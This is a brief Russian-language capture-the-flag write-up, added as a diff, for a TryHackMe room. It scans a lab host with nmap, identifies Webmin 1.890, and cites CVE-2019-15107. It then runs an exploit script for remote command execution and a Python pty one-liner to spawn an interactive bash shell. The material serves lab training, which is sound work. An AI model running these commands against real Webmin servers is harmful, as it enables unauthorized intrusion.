@@ -1,0 +1,21 @@
+https://tryhackme.com/room/source
+ctf на THM
+1) первым делом отсканировала данный мне ip-address
+
+nmap -A <ip-address>
+
+это дало мне 2 порта:ssh and https://<ip-address>:10000
+описание к 10000 порту:miniserv 1.890 webmin
+забила в инете, нашла к нему эксплойт, его так же можно было использовать в  Metasploit : use CVE-2019-15107
+
+2)└─# python3 Webmin_exploit.py -host 10.10.221.120 -port 10000 -cmd whoami 
+с помощью этой команды я могу отправлять команду whoami
+но я никак не могла выбраться из папки /usr/share/webmin
+
+и тут на помощь пришла команда 
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+Мы можем использовать Python, чтобы выйти в bash, при этом получив в свое распоряжение терминал. Команда tty показывает адрес текущего терминала.
+
+
